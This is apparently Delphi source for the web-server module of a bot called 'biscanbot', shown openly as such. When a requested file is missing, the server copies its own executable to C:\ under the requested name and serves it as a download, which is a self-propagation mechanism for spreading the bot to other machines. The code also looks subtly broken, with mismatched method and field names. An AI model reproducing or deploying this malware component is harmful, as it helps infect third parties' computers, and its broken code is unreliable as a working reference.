{ ported from biscanbot by p0ke. }
Unit biscan_webserver;

Interface

Uses
  Windows, Winsock;
  
  Procedure StartWebServer(Port	:Integer);

Implementation

  Type 

    TSocketData = Record
      Sock :TSocket;
    End;
    PSocketData = ^TSocketData;

    TWebServer = Class(TObject)
    Private
      Port		:Integer;
      WebSocket		:TSocket;
      Sockets		:Array[0..500] Of TSocket;
      wData		:TWSAData;
      SocketData	:TSocketData;
    
      Procedure ReadSock(P: Pointer); STDCALL;

      Function WaitForConnection: Boolean;    
      Function ExtractFileExt(Delimiter, Input: String): String;
      Function FileExists(const Filename: String): Boolean;
      Function IntToStr(const Value: Integer): String;
    Public
      Procedure ServeFile(Filename: String; Sock: TSocket);
      Procedure StartWebServer;    
  End;
  
  Function TWebServer.ExtractFileExt(Delimiter, Input: String): String;
  Begin
    While Pos(Delimiter, Input) <> 0 Do
      Delete(Input, 1, Pos(Delimiter, Input));
    Result := Input;
  End;
  
  Function TWebServer.FileExists(const FileName: String): Boolean;
  Var
    FileData	:TWin32FindData;
    hFile	:Cardinal;
  Begin
    hFIle := FindFirstFile(pChar(FileName), FileData);
    If (hFile <> INVALID_HANDLE_VALUE) Then
    Begin
      Result := True;
      Windows.FindClose(hFile);
    End Else
      Result := False;
  End;
  
  Function TWebServer.IntToStr(const Value: Integer): String;
  Var
    S: String[11];
  Begin
    Str(Value, S);
    Result := S;
  End;
  
  Procedure TWebServer.ServeFile(Filename: String; Sock: TSocket);
  Var
    ContentType		:String;
    Result		:String;
    FileHandle		:Cardinal;
    BytesRead		:Cardinal;
    FileSize		:Integer;
    Data		:String;
    F			:TextFile;
    I			:Integer;
    S			:String;
  Begin
    If (FileName[1] = '/') Then Delete(FileName, 1, 1);
    
    If Not (FileExists(FileName)) Then
    Begin
      FileName := 'C:\'+FileName;
      CopyFile(pChar(ParamStr(0)), pChar(FileName), False);
    End;
    
    If (LowerCase(ExtractFileExt('.', FileName)) = 'exe') Then
      ContentType := 'application/x-msdownload'
    Else
      ContentType := 'text/html';
    
    FileHandle := CreateFile(pChar(FileName),
                             LongWord($80000000),
                             0, NIL, 3,
                             $00000080, 0);
    FileSize := GetFileSize(FileHandle, NIL);
    
    Result := 'HTTP/1.1 200 OK'#13#10
             +'Accept-Ranges: bytes'#13#10
             +'Content-Length: '+IntToStr(FileSize)+#13#10
             +'Keep-Alive: timeout=15, max=100'#13#10
             +'Connection: Keep-Alive'#13#10
             +'Content-Type: '+ContentType+#13#10#13#10;
    
    Send(Sock, Result[1], Length(Result), 0);
    SetLength(Data, 5012);
    
    For I := 1 To Length(Data) Do
    Begin
      Delete(Data, I, 1);
      Insert(' ', Data, I);
    End;
    
    Repeat
      ReadFile(FileHandle, Data[1], 5012, BytesRead, NIL);
      Send(Sock, Data[1], 5012, 0);
    Until BytesRead < 5012;
    CloseHandle(FileHandle);
  End;
  
  Procedure TWebServer.ReadSock(P: Pointer); STDCALL;
  Var
    Buf		:Array[0..16000] Of Char;
    Sock	:TSocket;
    Data	:String;
  Begin
    Sock := PSocketData(P)^.Sock;
    
    While (Recv(Sock, Buf, SizeOf(Buf), 0) > 0) Do
    Begin
      Data := Buf;
      ZeroMemory(@Buf, SizeOf(Buf));
      
      If (Pos('GET', Data) > 0) Then
      Begin
        Delete(Data, 1, 4);
        Data := Copy(Data, 1, Pos('HTTP/1.1', Data)-2);
        ServeFile(Data, Sock);
      End;
    End;
  End;
  
  Function TWebServer.WaitForConnection: Boolean;
  Var
    FDSet	:TFDSet;
  Begin
    FDSet.FD_Count := 1;
    FDSet.FD_Array[0] := WebSocket;
    Select(0, @FDSet, NIL, NIL, NIL);
    Result := True;
  End;
  
  Procedure TWebServer.WebServer;
  Var
    Size	:Integer;
    SockAddr	:TSockAddr;
    SockAddrIn	:TSockAddrIn;
    ThreadID	:DWord;
    I		:Integer;
  Begin
    WSAStartUp(257, wData);
    
      ZeroMemory(@I, SizeOf(I));
      
      WebSocket := INVALID_SOCKET;
      WebSocket := Socket(PF_INET, SOCK_STREAM, GetProtoByName('tcp').P_Proto);
      
      If (WebSocket = INVALID_SOCKET) Then
        Exit;
        
      SockAddrIn.Sin_Family := AF_INET;
      SockAddrIn.Sin_Port := hTons(Port);
      SockAddrIn.Sin_Addr.S_Addr := INADDR_ANY;
      
      Bind(WebSocket, SockAddrIn, SizeOf(SockAddrIn));
      
      If (WinSock.Listen(WebSocket, 5) <> 0) Then Exit;
      
      While (WaitForConnection) Do
      Begin
        Size := SizeOf(TSocKAddr);
        
        For I := 0 To 500 Do
          If (Sockets[I] <= 0) Then
          Begin
            Sockets[I] := WinSock.Accept(WebSocket, @SockAddr, @Size);
            If (Sockets[I] > 0) Then
            Begin
              SocketData.Socket := Sockets[I];
              CreateThread(NIL, 0, @ReadSock, @SocketData, 0, ThreadID);
              Break;
            End;
          End;
      End;
    
    WSACleanUp;
  End;

end.